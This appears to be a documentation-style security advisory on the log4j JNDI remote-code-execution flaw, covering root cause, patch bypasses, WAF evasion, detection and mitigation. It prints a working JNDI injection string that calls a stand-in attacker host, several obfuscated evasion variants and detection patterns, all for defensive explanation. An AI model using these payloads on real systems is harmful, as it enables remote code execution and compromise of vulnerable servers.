  **CVSS 10.0**  ·  **Affected:** log4j-core 2.0-beta9 through 2.14.1  ·  **Fixed:** 2.17.1
</Warning>

## Executive summary

Any log statement that includes attacker-controlled input can trigger a JNDI lookup, causing the JVM to fetch and execute a remote class. One string, unauthenticated, pre-auth in most apps.

```text
${jndi:ldap://attacker.com/a}
```

## Root cause

log4j's `MessageLookup` recursively expands `${...}` expressions in log messages. The `jndi:` prefix routes the lookup through `javax.naming.InitialContext`, which happily follows LDAP or RMI references and deserializes the returned object.

<AccordionGroup>
  <Accordion title="Vulnerable call path">
    ```text
    Logger.info(userInput)
      -> MessagePatternConverter.format()
        -> StrSubstitutor.substitute()
          -> JndiLookup.lookup()
            -> InitialContext.lookup("ldap://attacker/a")
              -> class fetched, deserialized, executed
    ```
  </Accordion>

  <Accordion title="Why 2.15 wasn't enough">
    The 2.15 patch restricted JNDI to `java` protocol and localhost, but `${jndi:ldap://127.0.0.1#evil.com/a}` and Thread Context Map bypasses (CVE-2021-45046) reopened the door. 2.16 removed the lookup entirely. 2.17 fixed a DoS. 2.17.1 fixed one more JDBC path.
  </Accordion>
</AccordionGroup>

## Why signature-based WAFs failed

log4j supports nested lookups, so attackers used them for evasion:

```text
${${lower:j}${lower:n}di:ldap://...}
${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://...}
${${::-j}${::-n}${::-d}${::-i}:ldap://...}
```

Every `${` expansion is legal syntax. A regex chasing `jndi:` misses all of the above.

## Detection

<CardGroup cols={2}>
  <Card title="Sigma" icon="eye">
    Alert on `\${jndi:` (and hex/unicode variants) in any web log field.
  </Card>

  <Card title="Runtime" icon="shield">
    Hook `InitialContext.lookup` in-JVM. Falco / OSQuery for outbound LDAP from JVM PIDs.
  </Card>

  <Card title="Network" icon="network-wired">
    JVMs suddenly talking LDAP/RMI outbound is almost always bad.
  </Card>

  <Card title="IOC hunt" icon="magnifying-glass">
    `grep -rE '\\$\\{jndi:' /var/log`. Yes, really.
  </Card>
</CardGroup>

## Mitigation checklist

- [ ] Upgrade `log4j-core` to 2.17.1\+ (Java 8) or 2.12.4 (Java 7).
- [ ] If you cannot upgrade: remove `JndiLookup.class` from the jar.
- [ ] Egress-filter outbound LDAP/RMI/DNS from application tiers.
- [ ] Deploy a JVM agent (`hotpatch`) on legacy hosts you can't restart.
